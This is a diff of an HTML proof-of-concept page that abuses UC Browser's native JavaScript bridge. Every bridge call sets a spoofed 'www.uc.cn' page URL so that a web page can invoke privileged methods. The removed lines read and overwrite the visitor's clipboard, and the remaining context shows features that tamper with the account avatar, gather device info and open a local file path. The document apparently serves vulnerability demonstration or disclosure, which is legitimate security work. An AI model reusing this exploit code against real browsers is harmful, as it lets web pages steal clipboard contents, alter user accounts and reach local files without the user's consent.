@@ -63,21 +63,6 @@
     <p><span class="larger">Get Your Device Info:</span></p>
     <p style="font-size: 15px;" id="Battery"></p>
 
-    <p><span class="larger">Read Your ClipBoard:</span></p>
-    Will get your ClipBoard text:
-    <p style="font-size: 15px;" id="ClipBoardText"></p>
-    <input type="button" value="Access ClipBoard" id="AccessClipBoard" style="font-size: 20px; padding: 20px 25px;"/>
-
-    <p><span class="larger">Write to Your ClipBoard:</span></p>
-    Will copy the following text to your ClipBoard:
-    <p style="font-size: 15px;" id="ClipBoardWriteText"></p>
-    <script>
-        const now = new Date();
-        const timeStringSeconds = now.toLocaleDateString('en-US') + ' ' + now.toLocaleTimeString('en-US');
-        document.getElementById("ClipBoardWriteText").innerText = "I can write to your ClipBoard! " + timeStringSeconds;
-    </script>
-    <input type="button" value="Write to ClipBoard" id="WriteClipBoard" style="font-size: 20px; padding: 20px 25px;"/>
-
     <p><span class="larger">Tamper with Your Account Avatar:</span></p>
     <p>Will change user's UC account avator to this image:</p>
     <div class="image-with-text">
@@ -218,34 +203,6 @@
             methodParams: {
                 file_uri: "/private/var/mobile/Documents/localPDF.pdf",
                 by_system: 0
-            },
-            pageURL: "https://www.uc.cn/",
-            windowId: window.ucapi.windowId
-        }).then(function(a) {
-        });
-    }
-
-    document.getElementById("AccessClipBoard").onclick = function () {
-        window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
-            invokeId: "callback",
-            methodName: "clipboard.getClipBoardString",
-            methodParams: {
-            },
-            pageURL: "https://www.uc.cn/",
-            windowId: window.ucapi.windowId
-        }).then(function(a) {
-            var json = a;
-
-            document.getElementById("ClipBoardText").innerText = json.data;
-        });
-    }
-    
-    document.getElementById("WriteClipBoard").onclick = function () {
-        window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
-            invokeId: "callback",
-            methodName: "clipboard.setClipBoardString",
-            methodParams: {
-                data: document.getElementById("ClipBoardWriteText").innerText
             },
             pageURL: "https://www.uc.cn/",
             windowId: window.ucapi.windowId
